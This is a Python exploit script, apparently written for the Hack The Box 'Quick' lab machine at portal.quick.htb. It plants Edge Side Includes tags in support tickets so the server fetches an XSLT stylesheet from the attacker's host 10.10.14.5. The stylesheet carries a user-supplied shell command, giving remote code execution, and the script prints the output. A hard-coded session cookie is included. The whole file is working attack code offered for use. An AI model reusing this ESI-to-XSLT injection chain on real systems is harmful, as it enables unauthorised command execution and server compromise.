import itertools
import requests
import http.server, ssl
from requests.auth import HTTPBasicAuth

port = 5
tid = 20131
create_url = 'http://portal.quick.htb:9001/ticket.php'
read_url = 'http://portal.quick.htb:9001/search.php?search='
cook = {'PHPSESSID':'e8acjj2u9k94pbphrd8a92rcg6'}

def generate_xls(cmd,v):
    global tid

    template = open("/home/kali/snack/quick/sploit"+v+".xsl",'r')
    lines = template.readlines()
    res = "/home/kali/snack/quick/payloads/temp"+str(tid)+".xsl"
    f = open(res,"w")

    for l in lines:
        if "kunseok" in l:
            x = l.replace("kunseok",cmd)
            f.write(x)
        else:
            f.write(l)

    f.close()
    template.close()
    return "/payloads/temp"+str(tid)+".xsl"

def make_ticket(path):
    global port
    global tid

    body = {
        'title':'kun',
        'msg':"<esi:include src=\"\" stylesheet=\"http://10.10.14.5:" + \
            str(port) + path +"\"></esi:include>",
        'id':'TKT-'+str(tid)
    }

    r = requests.post(create_url,data=body,cookies=cook)
    return r.text

def open_ticket():
    global tid
    temp = read_url + str(tid)
    print(temp)
    r = requests.post(temp,cookies=cook)
    return r.text


def create_read(v):
    # generate xls
    global tid
    cmd = input("cmd: ")
    created = False

    while(not created):
        path = generate_xls(cmd,v)

        # create ticket
        res = make_ticket(path)

        if "This ticket exists." in res:
            created = False
        else:
            created = True
            text = open_ticket()
            print(text)
        tid += 1



# open listening port
v = input("version: ")
while(True):
    create_read(v)

    '''
    r = requests.post(url, data = body)
    server_address = ('10.10.14.5', port)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()
    port += 1
    '''
